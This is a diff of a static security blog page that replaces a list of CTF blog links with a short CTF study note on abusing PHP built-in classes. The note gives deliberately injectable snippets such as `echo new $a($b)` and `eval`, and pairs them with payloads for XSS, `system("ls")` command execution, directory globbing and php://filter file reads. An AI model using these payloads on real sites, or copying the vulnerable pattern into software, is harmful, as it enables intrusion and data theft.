@@ -16,25 +16,24 @@
   <meta name="author" content="cat">
   <meta name="keywords" content="">
   
-    <meta name="description" content="一些关于ctf、渗透的大佬博客">
+    <meta name="description" content="在ctf练习中发现当前我未认知到的关于php原生类一些问题">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ctf大佬博客">
-<meta property="og:url" content="http://sec-cat.github.io/2022/05/20/ctfshowblog/index.html">
+<meta property="og:title" content="关于php中原生类的应用">
+<meta property="og:url" content="http://sec-cat.github.io/2023/05/06/phpinterator/index.html">
 <meta property="og:site_name" content="Sec-cat&#39;s Blog">
-<meta property="og:description" content="一些关于ctf、渗透的大佬博客">
+<meta property="og:description" content="在ctf练习中发现当前我未认知到的关于php原生类一些问题">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://sec-cat.github.io/img/ctfshowblog/ctf.jpg">
-<meta property="article:published_time" content="2022-05-20T04:02:23.000Z">
-<meta property="article:modified_time" content="2023-05-06T02:05:52.368Z">
+<meta property="og:image" content="http://sec-cat.github.io/img/phpinterator/php.jpg">
+<meta property="article:published_time" content="2023-05-06T01:57:40.000Z">
+<meta property="article:modified_time" content="2023-05-06T02:05:00.185Z">
 <meta property="article:author" content="cat">
-<meta property="article:tag" content="ctf">
-<meta property="article:tag" content="ctfshow">
+<meta property="article:tag" content="php">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://sec-cat.github.io/img/ctfshowblog/ctf.jpg">
+<meta name="twitter:image" content="http://sec-cat.github.io/img/phpinterator/php.jpg">
   
   
   
-  <title>ctf大佬博客 - Sec-cat&#39;s Blog</title>
+  <title>关于php中原生类的应用 - Sec-cat&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -200,7 +199,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="ctf大佬博客"></span>
+            <span id="subtitle" data-typed-text="关于php中原生类的应用"></span>
           
         </div>
 
@@ -211,8 +210,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-05-20 12:02" pubdate>
-          2022年5月20日 中午
+        <time datetime="2023-05-06 09:57" pubdate>
+          2023年5月6日 上午
         </time>
       </span>
     
@@ -223,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.3k 字
+          1k 字
         
       </span>
     
@@ -234,7 +233,7 @@
         
         
         
-          20 分钟
+          9 分钟
         
       </span>
     
@@ -279,17 +278,17 @@
     
     <div class="category row nomargin-x">
       <a class="category-item 
-          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="友情链接"
-        id="heading-844eea1b2387fb968291c78788e4d8ca" role="tab" data-toggle="collapse" href="#collapse-844eea1b2387fb968291c78788e4d8ca"
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="网络安全"
+        id="heading-a9fbbd40048656862e149a84b77b9b40" role="tab" data-toggle="collapse" href="#collapse-a9fbbd40048656862e149a84b77b9b40"
         aria-expanded="true"
       >
-        友情链接
-        <span class="list-group-count">(1)</span>
+        网络安全
+        <span class="list-group-count">(2)</span>
         <i class="iconfont icon-arrowright"></i>
       </a>
       
-      <div class="category-collapse collapse show" id="collapse-844eea1b2387fb968291c78788e4d8ca"
-           role="tabpanel" aria-labelledby="heading-844eea1b2387fb968291c78788e4d8ca">
+      <div class="category-collapse collapse show" id="collapse-a9fbbd40048656862e149a84b77b9b40"
+           role="tabpanel" aria-labelledby="heading-a9fbbd40048656862e149a84b77b9b40">
         
         
           
@@ -298,10 +297,19 @@
     
       
       
-        <a href="/2022/05/20/ctfshowblog/" title="ctf大佬博客"
+        <a href="/2023/05/06/phpinterator/" title="关于php中原生类的应用"
            class="list-group-item list-group-item-action
            active">
-          <span class="category-post">ctf大佬博客</span>
+          <span class="category-post">关于php中原生类的应用</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/04/26/alltools/" title="攻防武器库"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">攻防武器库</span>
         </a>
       
     
@@ -324,12 +332,12 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">ctf大佬博客</h1>
+            <h1 style="display: none">关于php中原生类的应用</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：1 分钟前
+                    本文最后更新于：2 分钟前
                   
                 
               </p>
@@ -338,82 +346,36 @@
               <div class="markdown-body">
                 
                 <div class="note note-success">
-            <p>一些关于ctf、渗透的大佬博客</p>
+            <p>在ctf练习中发现当前我未认知到的关于php原生类一些问题</p>
           </div>
 <span id="more"></span>
-<ul>
-<li>这不是个博客 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_2880719/">https://blog.csdn.net/qq_2880719/</a></li>
-<li>小松博客 <a target="_blank" rel="noopener" href="https://www.woshidie.com/">https://www.woshidie.com/</a></li>
-<li>贝塔博客 <a target="_blank" rel="noopener" href="https://blog.csdn.net/Amherstieae">https://blog.csdn.net/Amherstieae</a></li>
-<li>R1博客 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_17696915/">https://blog.csdn.net/qq_17696915/</a></li>
-<li>ad博客 <a target="_blank" rel="noopener" href="https://dogge.top/">https://dogge.top/</a></li>
-<li>大周博客 <a target="_blank" rel="noopener" href="https://www.d1a0.cn/">https://www.d1a0.cn/</a></li>
-<li>三哈博客 <a target="_blank" rel="noopener" href="http://www.su-sanha.cn">http://www.su-sanha.cn</a></li>
-<li>serfend博客 <a target="_blank" rel="noopener" href="https://serfend.top">https://serfend.top</a></li>
-<li>羽博客 <a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/">https://blog.csdn.net/miuzzx/</a></li>
-<li>la博客 <a target="_blank" rel="noopener" href="https://lazzzaro.github.io/">https://lazzzaro.github.io/</a></li>
-<li>ha博客 <a target="_blank" rel="noopener" href="https://ha1c9on.top">https://ha1c9on.top</a></li>
-<li>fr博客 <a target="_blank" rel="noopener" href="https://blog.frankli.site/">https://blog.frankli.site/</a></li>
-<li>美女博客 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/">https://blog.csdn.net/qq_46091464/</a></li>
-<li>he博客 <a target="_blank" rel="noopener" href="https://hellohy.top">https://hellohy.top</a></li>
-<li>l0博客 <a target="_blank" rel="noopener" href="https://l0ne1">https://l0ne1</a></li>
-<li>y4博客 <a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/">https://y4tacker.blog.csdn.net/</a></li>
-<li>y4新博客 <a target="_blank" rel="noopener" href="http://blog.y4tacker.top/">http://blog.y4tacker.top/</a></li>
-<li>atao博客 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/erR0Ratao/">https://www.cnblogs.com/erR0Ratao/</a></li>
-<li>sc博客 <a target="_blank" rel="noopener" href="https://bbs.pediy.com/user-home-876323.htm">https://bbs.pediy.com/user-home-876323.htm</a></li>
-<li>雪晴博客 <a target="_blank" rel="noopener" href="https://yq1ng.github.io/">https://yq1ng.github.io/</a></li>
-<li>太空人博客 <a target="_blank" rel="noopener" href="https://blog.csdn.net/WFC1006848997">https://blog.csdn.net/WFC1006848997</a></li>
-<li>spaceman博客 <a target="_blank" rel="noopener" href="https://spaceman-911.gitee.io/">https://spaceman-911.gitee.io/</a></li>
-<li>typotypo博客 <a target="_blank" rel="noopener" href="https://typ0typ0.github.io/">https://typ0typ0.github.io/</a></li>
-<li>bit博客 <a target="_blank" rel="noopener" href="https://www.xl-bit.cn">https://www.xl-bit.cn</a></li>
-<li>错错博客 <a target="_blank" rel="noopener" href="https://typ0typ0.github.io/">https://typ0typ0.github.io/</a></li>
-<li>So4ms博客 <a target="_blank" rel="noopener" href="https://so4ms.top/">https://so4ms.top/</a></li>
-<li>yemoli博客 <a target="_blank" rel="noopener" href="https://yml-sec.top/">https://yml-sec.top/</a></li>
-<li>南方博客 <a target="_blank" rel="noopener" href="https://www.wlhhlc.top">https://www.wlhhlc.top</a></li>
-<li>feng博客 <a target="_blank" rel="noopener" href="https://ego00.blog.csdn.net/">https://ego00.blog.csdn.net/</a></li>
-<li>Tajang博客 <a target="_blank" rel="noopener" href="https://ctfking.com">https://ctfking.com</a></li>
-<li>Mason博客 <a target="_blank" rel="noopener" href="https://m4son.cn">https://m4son.cn</a></li>
-<li>Y0博客 <a href="yongsheng.site">yongsheng.site</a></li>
-<li>春哥知乎 <a target="_blank" rel="noopener" href="https://www.zhihu.com/people/ZM_________J/posts">https://www.zhihu.com/people/ZM_________J/posts</a></li>
-<li>yang99博客 <a target="_blank" rel="noopener" href="http://yang99.top">http://yang99.top</a></li>
-<li>striving <a target="_blank" rel="noopener" href="http://www.zbc53.top/">http://www.zbc53.top/</a></li>
-<li>天天被套神骂的废物博客 <a target="_blank" rel="noopener" href="https://github.com/davidcheyenneone/CTF">https://github.com/davidcheyenneone/CTF</a></li>
-<li>一只狗 <a target="_blank" rel="noopener" href="https://www.anquanke.com/member/155655">https://www.anquanke.com/member/155655</a></li>
-<li>菜牛 <a href="ww.njhlove.club">ww.njhlove.club</a></li>
-<li>孤桜懶契 <a target="_blank" rel="noopener" href="https://gylq.gitee.io">https://gylq.gitee.io</a></li>
-<li>1stPeak博客 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_4161703">https://blog.csdn.net/qq_4161703</a></li>
-<li>n03tAck团队博客 <a href="wp.n03tack.top">wp.n03tack.top</a></li>
-<li>Ocean <a href="blog.csdn.net/ocean">blog.csdn.net/ocean</a></li>
-<li>想学pwn的小web MuRKuo的博客 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/murkuo/">https://www.cnblogs.com/murkuo/</a></li>
-<li>花花的柚子 <a target="_blank" rel="noopener" href="https://blog.hanayuzu.top/">https://blog.hanayuzu.top/</a></li>
-<li>yun0tian <a target="_blank" rel="noopener" href="https://www.yun0tian.top/">https://www.yun0tian.top/</a></li>
-<li>alexzms <a target="_blank" rel="noopener" href="https://blog.alexzms.com/">https://blog.alexzms.com/</a></li>
-<li>小白’Blog <a target="_blank" rel="noopener" href="https://idiot-white.top/">https://idiot-white.top/</a></li>
-<li>pysnow <a target="_blank" rel="noopener" href="https://pysnow.cn">https://pysnow.cn</a></li>
-<li>Paidx0 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_49656607">https://blog.csdn.net/weixin_49656607</a></li>
-<li>M1sery的厨房 不太擅长做菜（悲 <a target="_blank" rel="noopener" href="https://www.yuque.com/misery333">https://www.yuque.com/misery333</a></li>
-<li>snakin <a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin">https://blog.csdn.net/cosmoslin</a></li>
-<li>mxx307 <a target="_blank" rel="noopener" href="http://www.mxx307.com/">http://www.mxx307.com/</a></li>
-<li>ISHEEPI <a target="_blank" rel="noopener" href="http://www.cryocry.cn">http://www.cryocry.cn</a></li>
-<li>Bnessy <a target="_blank" rel="noopener" href="https://bnessy.com/">https://bnessy.com/</a></li>
-<li>yink’s studio <a target="_blank" rel="noopener" href="https://yinkstudio.xyz">https://yinkstudio.xyz</a></li>
-<li>z1r0 <a target="_blank" rel="noopener" href="https://www.z1r0.top/">https://www.z1r0.top/</a></li>
-<li>fge7s <a target="_blank" rel="noopener" href="https://fge7s.cn">https://fge7s.cn</a></li>
-<li>ylcao <a target="_blank" rel="noopener" href="https://ylcao.top">https://ylcao.top</a></li>
-<li>impdx的博客 <a target="_blank" rel="noopener" href="https://www.impdx.vip">https://www.impdx.vip</a></li>
-<li>c0de的博客 <a target="_blank" rel="noopener" href="https://www.yuque.com/c0de">https://www.yuque.com/c0de</a></li>
-<li>唐仔橙 <a target="_blank" rel="noopener" href="http://tangzichengcc.github.io">http://tangzichengcc.github.io</a></li>
-<li>Squirt1e <a target="_blank" rel="noopener" href="http://www.squirt1e.top/">http://www.squirt1e.top/</a></li>
-<li>Paintrain <a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62506844">https://blog.csdn.net/m0_62506844</a></li>
-<li>v2ish1yan <a target="_blank" rel="noopener" href="http://v2ish1yan.top">http://v2ish1yan.top</a></li>
-<li>苏落的博客 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61993117">https://blog.csdn.net/qq_61993117</a></li>
-<li>q1jun的博客 <a target="_blank" rel="noopener" href="http://q1jun.cn">http://q1jun.cn</a></li>
-<li>S7iter的博客 <a target="_blank" rel="noopener" href="http://www.oosec.cn">http://www.oosec.cn</a></li>
-<li>M1n9K1n9 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54704239">https://blog.csdn.net/qq_54704239</a></li>
-<li>pankas的blog <a target="_blank" rel="noopener" href="https://pankas.top/">https://pankas.top/</a></li>
-<li>黎明破晓曙光晨曦 <a target="_blank" rel="noopener" href="https://f1eeg0urj5.feishu.cn/docx/VnlOd8o1KoytpJxkuyvcqBHAnEh">https://f1eeg0urj5.feishu.cn/docx/VnlOd8o1KoytpJxkuyvcqBHAnEh</a></li>
-<li>Nsus-Pwn <a target="_blank" rel="noopener" href="https://OSLike.github.io">https://OSLike.github.io</a></li>
-</ul>
+<h2 id="Error-Exception">Error/Exception</h2>
+<p>ERROR类中自动带有tostring魔术方法，如果这里是echo，即可造成XSS，或者用eval()命令执行</p>
+<h3 id="code">code</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo new <span class="hljs-subst">$a</span>(<span class="hljs-subst">$b</span>);&quot;</span>);<br></code></pre></td></tr></table></figure>
+<h3 id="payload">payload</h3>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">?a=<span class="hljs-title class_">Error</span>&amp;b=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?a=<span class="hljs-keyword">Exception</span>&amp;b=<span class="hljs-keyword">system</span>(&quot;ls&quot;)<br></code></pre></td></tr></table></figure>
+<h2 id="DirectoryIterator-FilesystemIterator-GlobIterator">DirectoryIterator/FilesystemIterator/GlobIterator</h2>
+<h3 id="code-2">code</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure>
+<h3 id="payload-2">payload</h3>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?a=DirectoryIterator<span class="hljs-meta">&amp;b=glob:<span class="hljs-comment">//f[a-z]*</span></span><br></code></pre></td></tr></table></figure>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?a=FilesystemIterator<span class="hljs-meta">&amp;b=glob:<span class="hljs-comment">//f[a-z]*</span></span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">glob是<span class="hljs-built_in">GlobIterator</span>类本身自带<br>?a=<span class="hljs-built_in">GlobIterator</span>&amp;b=f[a-z]*<br></code></pre></td></tr></table></figure>
+<h2 id="SplFileObject">SplFileObject</h2>
+<h3 id="code-3">code</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure>
+<h3 id="payload-3">payload</h3>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 读一行</span><br>?<span class="hljs-attribute">a</span>=SplFileObject&amp;b=flag.php<br></code></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 读文件协议</span><br>?a=SplFileObject&amp;b=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure>
+<h2 id="ReflectionClass-ReflectionMethod">ReflectionClass/ReflectionMethod</h2>
+<h3 id="code-4">code</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo new <span class="hljs-subst">$a</span>(<span class="hljs-subst">$b</span>);&quot;</span>);<br></code></pre></td></tr></table></figure>
+<h3 id="payload-4">payload</h3>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">?a=ReflectionClass<span class="hljs-variable">&amp;b</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&quot;ls&quot;</span>)<br></code></pre></td></tr></table></figure>
+<h2 id="参考">参考</h2>
+<p><a target="_blank" rel="noopener" href="https://ch1e.gitee.io/2021/11/12/yuanshenglei/">https://ch1e.gitee.io/2021/11/12/yuanshenglei/</a></p>
 
                 
               </div>
@@ -432,7 +394,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/" class="category-chain-item">友情链接</a>
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a>
   
   
 
@@ -447,9 +409,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/ctf/">#ctf</a>
-      
-        <a href="/tags/ctfshow/">#ctfshow</a>
+        <a href="/tags/php/">#php</a>
       
     </div>
   
@@ -461,8 +421,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>ctf大佬博客</div>
-      <div>http://sec-cat.github.io/2022/05/20/ctfshowblog/</div>
+      <div>关于php中原生类的应用</div>
+      <div>http://sec-cat.github.io/2023/05/06/phpinterator/</div>
     </div>
     <div class="license-meta">
       
@@ -474,7 +434,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年5月20日</div>
+          <div>2023年5月6日</div>
         </div>
       
       
@@ -506,15 +466,15 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/03/11/adversarial/" title="Adversarial">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Adversarial</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2023/05/01/highlightjs/" title="在vue中使用highlight.js实现代码显示">
+                        <span class="hidden-mobile">在vue中使用highlight.js实现代码显示</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
